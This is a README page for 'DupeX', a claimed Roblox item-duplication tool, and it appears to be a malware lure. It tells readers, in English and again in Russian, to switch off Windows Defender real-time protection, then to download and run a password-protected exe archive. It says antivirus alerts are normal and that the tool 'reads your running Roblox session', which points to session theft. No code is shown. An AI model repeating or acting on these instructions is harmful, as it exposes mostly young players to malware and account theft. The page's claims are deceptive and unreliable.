[README.md](https://github.com/user-attachments/files/34540691/README.md)
# DupeX v3.1

**Roblox Item Duplicator — trade desync method**

![version](https://img.shields.io/badge/version-3.1.7--prv-green) ![platform](https://img.shields.io/badge/platform-Windows%2010%2F11-blue) ![status](https://img.shields.io/badge/status-working-brightgreen) ![patch](https://img.shields.io/badge/patched-not%20yet-success)

Private build, uploaded by request. Works until the next Roblox trade-patch — use it while it's alive.

---

## ⚙️ Features

- Trade-desync duplication (server-side queue, no client memory edit)
- Game profiles: Your Bizarre Adventure, Pet Sim 99, Adopt Me, Blox Fruits, custom
- Batch dupe: 1–10 copies per run
- Auto session sync — no login required, reads your running Roblox session
- Console log with real-time operation status

## 🚀 How to use

1. Download `DupeX-v3.1.zip` from the **Download** section below
2. **Turn off Windows Defender real-time protection** — otherwise it eats the unpacked exe on sight. How: Windows Security → Virus & threat protection → Manage settings → Real-time protection → **Off**. Every exploit tool (executors, injectors, dupers) gets flagged like this — memory-access tools always trigger AV. After the dupe you can turn it right back on
3. Unpack and run `DupeX-v3.1.exe`
4. Start Roblox and enter any game
5. Enter your nickname, pick the game, type the item name, set the copy count
6. Press `DUPLICATE`
7. Wait for the queue message, then **restart Roblox** and run DupeX again in 10 minutes — items arrive after inventory resync

> Do not open your inventory between the run and the resync — it can roll the desync back.

## ❓ FAQ — straight answers

**Antivirus flags the file?**
Normal for any exploit tool — AVs flag process-memory access used by the desync method. Add an exclusion or disable real-time protection while using it. The build is private and not distributed anywhere else, so any "DupeX" from other sources is fake.

**Is this another dupe scam?**
Scam dupe tools ask for your **password or cookie** to "log in". DupeX never asks for either — it reads your already running Roblox session. Rule of thumb for any tool: if it wants your password, it's a stealer. This one doesn't have a single input for it.

**Ban risk?**
The desync happens server-side in the trade queue — no client injection, no memory writes to Roblox, nothing for anti-cheat to see. Still, standard practice: run your **first dupe on an alt** to see how items arrive, then use the main.

**Why did my previous dupe tool not work?**
Public dupe tools are patched corpses — they die the day they leak. This build is private, re-packed on every update and handed out person-to-person. That's exactly why the archive is password-protected.

**Does it need my password?**
No. It syncs with your running Roblox session. Never enter your password into tools that ask for it.

**It says "API unavailable"?**
The desync queue is rate-limited when many people dupe at once. Wait a couple of minutes and run again.

**When will it stop working?**
When Roblox patches the trade desync. Watch the badge at the top — this page is updated the same day a patch lands.

## 🔧 Source code

The **UI shell is open** (`src/`) — build it yourself with any .NET SDK: `dotnet build src`. The **trade-desync engine is closed** and ships only in release builds — open-sourcing it would be a one-way ticket to a patch. This is the standard split for private tools.

## 🖥 Requirements

- Windows 10 / 11 (x64)
- .NET Framework 4.8 (pre-installed on updated Windows)
- Running Roblox session (the tool syncs with it — no login data required)
- ~2 MB free space

## 📝 Changelog

**v3.1.7** — game profiles for Pet Sim 99 / Adopt Me / Blox Fruits, batch count 1–10, resync queue rework
**v3.1** — new UI, console log, restart-after-resync flow
**v3.0** — trade desync core rework after June patch

## 📥 Download

Latest build: **[Releases](../../releases)** → `DupeX-v3.1.zip`

Archive password: `dupex31`
(protected from re-packing and fake mirrors — passwords from random videos are fake)

---

## 🇷🇺 Кратко по-русски

DupeX — приватный дюпер предметов через трейд-десинк. **Перед распаковкой выруби реалтайм-защиту дефендера** (Безопасность Windows → Защита от вирусов → Управление настройками → Реалтайм-защита → выкл) — иначе он сожрёт exe на распаковке. Все эксплойты так палятся, это норма. Дальше: качаешь зип из релизов, **пароль `dupex31`**, распаковываешь, запускаешь, вводишь ник/игру/предмет, жмёшь DUPLICATE, перезапускаешь Roblox и через 10 минут запускаешь ещё раз — предметы доезжают после ресинка. Официальная сборка раздаётся только по ссылкам из этого репозитория — всё остальное фейки.

---

*Private research build. For educational use only. Not affiliated with Roblox Corporation.*
